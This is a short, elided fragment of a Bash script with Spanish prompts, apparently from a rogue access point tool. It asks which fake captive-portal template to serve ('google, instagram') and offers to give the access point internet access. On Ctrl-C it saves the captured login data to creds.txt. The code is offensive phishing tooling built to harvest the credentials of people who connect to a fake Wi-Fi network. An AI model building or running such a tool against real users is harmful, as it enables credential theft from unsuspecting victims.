...
function ctrl_c(){
	...
	cp ./pages/$pagina/datos.txt creds.txt > /dev/null 2>&1
	exit 0
}
...
#	if [ "$portalyesno" == "si" ]; then
	echo -ne "\nPlantilla para el portal cautivo (google, instagram): " && read -r pagina
#	fi

	echo -ne "\nProporcionar conexion a internet en el ap (y/n): " && read -r redirectyesno
	if [ "$redirectyesno" == "y" ]; then
